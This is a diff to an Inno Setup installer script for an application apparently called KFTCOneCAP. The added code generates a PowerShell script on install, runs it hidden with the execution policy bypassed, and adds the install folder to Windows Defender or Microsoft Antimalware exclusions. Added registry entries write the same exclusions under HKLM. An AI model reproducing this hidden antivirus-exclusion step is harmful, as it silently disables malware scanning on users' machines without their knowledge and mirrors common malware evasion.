@@ -50,7 +50,56 @@ Type: files; Name: "{userstartup}\{#AppName}.lnk"
 Type: files; Name: "{commondesktop}\{#AppName}.lnk"
 Type: files; Name: "{userdesktop}\{#AppName}.lnk"
 
+[Code]
+function IsWindows7: Boolean;
+var ver: Cardinal;
+begin
+  ver := GetWindowsVersion;
+  Result := (ver >= $06010000) and (ver < $06020000);
+end;
+
+function IsWindows8OrAbove: Boolean;
+begin
+  Result := (GetWindowsVersion >= $06020000);
+end;
+
+function GetPSPath: String;
+begin
+  if IsWin64 then
+    Result := GetWinDir + '\Sysnative\WindowsPowerShell\v1.0\powershell.exe'
+  else
+    Result := GetSystemDir + '\WindowsPowerShell\v1.0\powershell.exe';
+end;
+
+procedure CurStepChanged(CurStep: TSetupStep);
+var
+  AppPath, ScriptFile, PSPath: String;
+  Lines: TArrayOfString;
+  ResultCode: Integer;
+begin
+  if CurStep <> ssPostInstall then Exit;
+
+  PSPath := GetPSPath;
+  if not FileExists(PSPath) then Exit;
+
+  AppPath := ExpandConstant('{app}');
+  ScriptFile := ExpandConstant('{tmp}\DefExcl.ps1');
+  SetArrayLength(Lines, 1);
+
+  if IsWindows8OrAbove then
+    Lines[0] := 'try { Add-MpPreference -ExclusionPath ''' + AppPath + ''' -ErrorAction Stop } catch {}'
+  else if IsWindows7 then
+    Lines[0] := 'try { New-ItemProperty -Path ''HKLM:\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths'' -Name ''' + AppPath + ''' -Value 0 -PropertyType DWord -Force -ErrorAction Stop } catch {}';
+
+  if Lines[0] = '' then Exit;
+
+  SaveStringsToFile(ScriptFile, Lines, False);
+  Exec(PSPath, '-ExecutionPolicy Bypass -NonInteractive -File "' + ScriptFile + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+end;
+
 [Registry]
+Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"; ValueType: dword; ValueName: "{app}"; ValueData: "0"; Flags: uninsdeletevalue noerror; Check: IsWindows8OrAbove
+Root: HKLM; Subkey: "SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"; ValueType: dword; ValueName: "{app}"; ValueData: "0"; Flags: uninsdeletevalue noerror; Check: IsWindows7
 ; 설치 경로
 Root: HKCU; Subkey: "Software\KFTCOneCAP"; ValueType: string; ValueName: "InstallPath"; ValueData: "{app}"; Flags: uninsdeletekey createvalueifdoesntexist
 ; SERIALPORT 기본값
